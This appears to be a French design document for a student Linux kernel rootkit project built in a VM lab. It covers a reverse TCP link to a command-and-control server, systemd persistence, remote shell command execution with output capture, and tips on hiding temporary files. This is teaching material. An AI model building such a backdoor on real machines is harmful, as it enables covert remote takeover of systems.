# WLKOM — Document de conception

Approches possibles pour chaque feature **obligatoire**.
Pour chaque feature : comparatif, recommandation, risques.

## Tests automatisés

Les tests locaux sont écrits en Python dans `tests/run_tests.py`. Ce choix est volontaire :

| Critère | Justification |
|---|---|
| Disponibilité | Python 3 est présent sur l'environnement de développement et ne demande pas de dépendance externe. |
| Tests réseau simples | La bibliothèque standard permet d'ouvrir un port local, de lancer le C2 et de vérifier la première trame TCP envoyée. |
| Orchestration | Python permet de compiler le C2 avec `make`, de lancer un sous-processus, de choisir un port libre et de nettoyer le process proprement. |
| Séparation hôte/VM | Les tests locaux valident ce qui peut l'être sans charger de module kernel ; les tests `insmod`, `rmmod`, retry réel et compilation du `.ko` restent faits dans la VM victime. |

### Couverture actuelle

| Feature | Test automatisé | Limite |
|---|---|---|
| Compile | Vérifie que `rootkit/Makefile` déclare `wlkom.o` comme LKM et délègue `modules`/`clean` au build system kernel. | La génération réelle de `wlkom.ko` doit être faite dans la VM victime pour garantir le matching avec `uname -r`. |
| Connection | Vérifie la présence de la kthread, socket TCP kernel, `connect`, `recv`, `shutdown` et retry interruptible. | La connexion réelle et la reconnexion automatique restent validées par test manuel entre les deux VMs. |
| Password | Lance réellement le C2, se connecte dessus en TCP local, et vérifie l'envoi de `AUTH <hash_fnv1a>\n` avec le hash FNV-1a attendu. Vérifie aussi la logique d'auth côté module. | Le hash choisi est FNV-1a 32-bit : simple, sans dépendance externe, mais non cryptographique. Pour une version plus robuste, remplacer par SHA-256. |

Ces tests ne remplacent pas les tests d'intégration dans QEMU : ils servent de filet rapide avant de recompiler/recharger le module dans la VM.

### Hash du mot de passe

Le protocole d'authentification utilise FNV-1a 32-bit. Le C2 reçoit le mot de passe en clair sur sa ligne de commande, calcule son hash, puis envoie uniquement :

```text
AUTH <hash_fnv1a>
```

Le module kernel ne reçoit pas le mot de passe brut : il reçoit `password_hash=<hash_fnv1a>` au chargement. En mode manuel, la valeur peut être passée à `insmod`; en mode persistant, l'installateur demande le mot de passe, calcule FNV-1a, écrit le hash dans `/etc/modprobe.d/wlkom.conf`, puis `modprobe wlkom` le transmet automatiquement via `wlkom.service`. Le module compare deux chaînes hexadécimales. Cette solution évite le secret hardcodé et évite de le comparer directement en clair côté kernel. FNV-1a n'est pas cryptographiquement sûr ; il a été choisi ici pour rester autonome, court, reproductible en C userland et facile à vérifier dans le cadre pédagogique.

---

## Feature 1 — Compile (0.5pt)

Une seule approche raisonnable : **Makefile LKM standard** ciblant `wlkom.ko`.

```makefile
obj-m += wlkom.o
all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules
```

**Prérequis sur la victim VM :**
- `linux-headers-$(uname -r)` (Debian/Ubuntu) ou `linux-headers` (Arch)
- `build-essential` / `base-devel`
- `gcc`

**Risques :** aucun si les headers correspondent exactement à la version du kernel en cours d'exécution. Si le kernel est mis à jour sans mettre à jour les headers → recompiler.

---

## Feature 2 — Connection (3pt)

Le rootkit doit initier une connexion TCP vers le C2 (reverse connection), la maintenir, et retry si elle tombe.

### Approche A — Socket kernel avec `sock_create_kern` ✅ Recommandé

Le rootkit crée un `kthread` au chargement. Ce thread tourne en boucle :
1. Tente `sock_create_kern` + `kernel_connect` vers l'IP/port du C2
2. Si succès → maintient la connexion (bloqué sur `kernel_recvmsg` en attente de commandes)
3. Si échec ou déconnexion → `msleep(30000)` puis retry

```c
#include <linux/net.h>
#include <linux/in.h>
#include <net/sock.h>

// IP/port passés en module_param
static char *c2_ip = "192.168.1.100";
static int   c2_port = 4444;
module_param(c2_ip, charp, 0);
module_param(c2_port, int, 0);
```

| Critère | Note |
|---|---|
| Simplicité | Moyenne — API kernel ésotérique mais bien documentée |
| Robustesse | Haute — tout dans le kernel, pas de dépendance user-space |
| Scalabilité | Haute — le même socket sert pour les commandes |

**Risques :**
- `kernel_connect` est bloquant par défaut → obligatoire de l'appeler depuis un kthread, pas depuis `init`
- Le kthread doit checker `kthread_should_stop()` dans sa boucle pour pouvoir être arrêté proprement au `rmmod`
- Certains kernels récents nécessitent `allow_signal(SIGKILL)` dans le thread

---

### Approche B — `call_usermodehelper` pour lancer un binaire user-space

Au `init`, utiliser `call_usermodehelper` pour lancer un script shell ou Python qui gère la connexion TCP.

| Critère | Note |
|---|---|
| Simplicité | Haute — pas d'API réseau kernel |
| Robustesse | Faible — dépend d'un binaire user-space présent sur le système |
| Scalabilité | Faible — difficile de faire transiter les I/O entre kernel et user |

**Non recommandé** : casse le modèle "tout dans le kernel" ; difficile de remonter stdout/stderr des commandes.

---

### Approche C — Netlink socket (kernel ↔ daemon user-space)

Le kernel module communique via Netlink avec un daemon user-space qui gère le TCP.

| Critère | Note |
|---|---|
| Simplicité | Basse — protocole Netlink verbeux et complexe |
| Robustesse | Haute |
| Scalabilité | Moyenne |

**Non recommandé** pour ce projet : sur-complexité inutile, deux composants à maintenir.

---

## Feature 3 — Persistence (1.5pt)

Le rootkit doit survivre à un reboot **et** se reconnecter au C2.

### Approche A — Systemd service ✅ Recommandé

Le repo fournit `rootkit/install_persistence.sh`, à lancer sur la VM victime après compilation du module. Il demande le mot de passe en interactif, calcule son hash FNV-1a, installe `wlkom.ko`, écrit la configuration `modprobe`, crée le service systemd et l'active au boot. Le service utilise `modprobe` plutôt qu'`insmod`, afin de récupérer automatiquement les paramètres depuis `/etc/modprobe.d/wlkom.conf`.

Créer `/etc/systemd/system/wlkom.service` :

```ini
[Unit]
Description=WLKOM
After=network-online.target
Wants=network-online.target

[Service]
Type=oneshot
ExecStart=/sbin/modprobe wlkom
ExecStop=/sbin/modprobe -r wlkom
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
```

```bash
cd /mnt/vmshare/rootkit
make
sudo ./install_persistence.sh 192.168.100.10 4444
sudo systemctl start wlkom.service
```

| Critère | Note |
|---|---|
| Simplicité | Haute |
| Robustesse | Haute — `After=network-online.target` attend le réseau, et le kthread du module continue de retry si le C2 n'est pas encore prêt |
| Discrétion | Faible (service visible avec `systemctl list-units`) |

**Risques :** si la victim VM n'a pas systemd (peu probable) → fallback approche B. Si le kernel change, il faut recompiler `wlkom.ko` et relancer `install_persistence.sh`, car le module est installé dans `/lib/modules/$(uname -r)/extra/`.

---

### Approche B — `/etc/modules` + `/etc/modprobe.d/`

Ajouter `wlkom` dans `/etc/modules` et les paramètres dans `/etc/modprobe.d/wlkom.conf`.

```
# /etc/modprobe.d/wlkom.conf
options wlkom password_hash=<hash_fnv1a> c2_ip=X.X.X.X c2_port=4444
```

| Critère | Note |
|---|---|
| Simplicité | Haute |
| Robustesse | Moyenne — ordre de chargement non garanti, réseau peut ne pas être up |
| Discrétion | Faible |

**Non recommandé** : pas de garantie que le réseau est disponible au moment du chargement.

---

### Approche C — Cron `@reboot`

```cron
@reboot root insmod /path/to/wlkom.ko c2_ip=X.X.X.X
```

| Critère | Note |
|---|---|
| Simplicité | Haute |
| Robustesse | Faible — cron démarre tôt, souvent avant le réseau |
| Discrétion | Faible |

**Non recommandé.**

---

## Feature 4 — Executing commands (5pt)

Depuis le C2, envoyer une commande shell ; le rootkit l'exécute et renvoie stdout, stderr, exit code.

### Approche A — `call_usermodehelper` + fichiers temporaires ✅ Recommandé

1. Le C2 envoie la commande via le socket (ex: `CMD id\n`)
2. Le kthread du rootkit construit : `"/bin/sh -c 'id > /tmp/.wk_o 2>/tmp/.wk_e; echo $? > /tmp/.wk_x'"`
3. `call_usermodehelper` exécute ce one-liner (flag `UMH_WAIT_PROC`)
4. Lire `/tmp/.wk_o`, `/tmp/.wk_e`, `/tmp/.wk_x` via `filp_open` + `kernel_read`
5. Envoyer le contenu au C2 via `kernel_sendmsg`

```c
char *argv[] = { "/bin/sh", "-c", cmd_buf, NULL };
char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/bin", NULL };
call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
```

| Critère | Note |
|---|---|
| Simplicité | Haute — pas de pipe kernel |
| Robustesse | Moyenne — race condition si deux commandes simultanées |
| Capture output | Via fichiers `/tmp` lus avec `filp_open` |

**Risques :**
- Les fichiers `/tmp/.wk_*` sont visibles en user-space → les supprimer après lecture, ou utiliser un chemin caché (ex: `/dev/shm/.wk`)
- Pas de concurrence : traiter les commandes séquentiellement dans le kthread
- Taille des outputs limités par la taille du buffer alloué → tronquer si nécessaire

---

### Approche B — `call_usermodehelper` + pipes anonymes

Créer des pipes en kernel space, y attacher le process fils, lire le stdout/stderr directement en mémoire.

| Critère | Note |
|---|---|
| Simplicité | Basse — gestion des pipes en kernel space très complexe |
| Robustesse | Haute en théorie |
| Capture output | Directement en mémoire, propre |

**Non recommandé** pour démarrer : complexité injustifiée, très peu d'exemples disponibles.

---

### Approche C — Reverse shell `/bin/sh` sur le socket

Rediriger stdin/stdout/stderr du shell directement vers le socket TCP.

```c
// dupliquer le fd du socket vers 0, 1, 2 du process fils
```

| Critère | Note |
|---|---|
| Simplicité | Moyenne |
| Robustesse | Haute — I/O directe |
| Capture output | stdout et stderr mélangés, pas de exit code séparé |

**Acceptable** si on accepte de ne pas séparer stdout/stderr — mais perd des points sur la spec (qui demande stdout, stderr, et exit code séparément).

---

## Protocole réseau implémenté

Texte simple, messages délimités par `\n`, sans encodage intermédiaire.

### Phase d'authentification (à chaque connexion)

```
# C2 → Rootkit
AUTH <hash_fnv1a_08x>\n
```

Le C2 envoie ce message dès qu'un client se connecte. Le rootkit lit la ligne, vérifie que le préfixe est `AUTH ` puis compare le hash reçu avec `password_hash` (passé en `module_param` au chargement). Si la comparaison échoue, le socket est fermé et le rootkit retry.

### Phase de commandes (après auth réussie)

```
# C2 → Rootkit
<commande shell>\n

# Rootkit → C2
[Exit Status: <code>]\n
--- STDOUT ---\n
<contenu stdout brut, multi-lignes possible>\n
--- STDERR ---\n
<contenu stderr brut, multi-lignes possible>\n
--- End of Output ---\n
\n
```

Chaque réponse se termine par le marqueur `--- End of Output ---\n\n` (ligne vide finale). Le C2 lit en continu jusqu'à ce marqueur pour délimiter la fin d'une réponse avant d'afficher le prompt suivant.

**Choix de conception :**
- Pas de préfixe `CMD` côté C2 : la commande est envoyée telle quelle, ce qui simplifie le parsing côté kernel (pas de parsing de token)
- Pas de base64 : les sorties brutes sont transmises directement ; les `\n` internes ne posent pas de problème car le délimiteur de fin est le marqueur `--- End of Output ---`
- Pas de message `CONNECTED` : inutile, le C2 attend simplement la réponse à sa première commande
